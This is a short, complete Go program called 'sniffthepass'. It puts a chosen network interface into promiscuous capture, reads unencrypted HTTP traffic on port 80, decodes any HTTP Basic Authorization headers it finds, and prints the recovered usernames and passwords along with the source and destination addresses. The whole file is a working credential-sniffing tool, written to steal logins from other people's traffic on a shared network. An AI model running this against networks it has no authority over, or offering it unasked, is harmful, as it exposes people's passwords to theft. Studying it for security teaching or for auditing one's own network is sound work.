package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func processHTTPPayload(ip4 *layers.IPv4, payload []byte) {
	str := string(payload)
	lines := strings.Split(str, "\r\n")

	for _, l := range lines {
		if strings.HasPrefix(l, "Authorization: Basic ") == true {
			b := strings.TrimPrefix(l, "Authorization: Basic ")

			if secret, err := base64.StdEncoding.DecodeString(b); err == nil {
				fmt.Printf("%v - > %v : %s\n", ip4.SrcIP, ip4.DstIP, secret)
				break
			}
		}
	}
}

func processTCPSegment(ip4 *layers.IPv4, t *layers.TCP) {
	if t.DstPort == 80 {
		processHTTPPayload(ip4, t.Payload)
	}
}

func processPacket(packet gopacket.Packet) {
	if ip := packet.Layer(layers.LayerTypeIPv4); ip != nil {
		ip4, _ := ip.(*layers.IPv4)
		if tcp := packet.Layer(layers.LayerTypeTCP); tcp != nil {
			t, _ := tcp.(*layers.TCP)
			processTCPSegment(ip4, t)
		}
	}
}

func main() {
	fmt.Println("sniffthepass")

	netInfs, err := pcap.FindAllDevs()

	if err != nil {
		log.Fatal(err)
	}

	if len(netInfs) == 0 {
		log.Fatal("No network interfaces found")
	}

	for i, intf := range netInfs {
		fmt.Printf("%d. %s\n", i, intf.Name)

		for _, addr := range intf.Addresses {
			fmt.Printf("%s/%s\n", addr.IP, addr.Netmask)
		}

		fmt.Println("---------------------------------")
	}

	stdinReader := bufio.NewReader(os.Stdin)
	fmt.Println("Enter interface number")
	inStr, err := stdinReader.ReadString('\n')
	if err != nil {
		log.Fatal(err)
	}
	intfNumber, err := strconv.Atoi(strings.Replace(inStr, "\n", "", 1))
	if err != nil {
		log.Fatal(err)
	}

	if intfNumber < 0 || intfNumber >= len(netInfs) {
		log.Fatal("Out of bounds")
	}

	handle, err := pcap.OpenLive(netInfs[intfNumber].Name, 1600, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

	for packet := range packetSource.Packets() {
		processPacket(packet)
	}
}
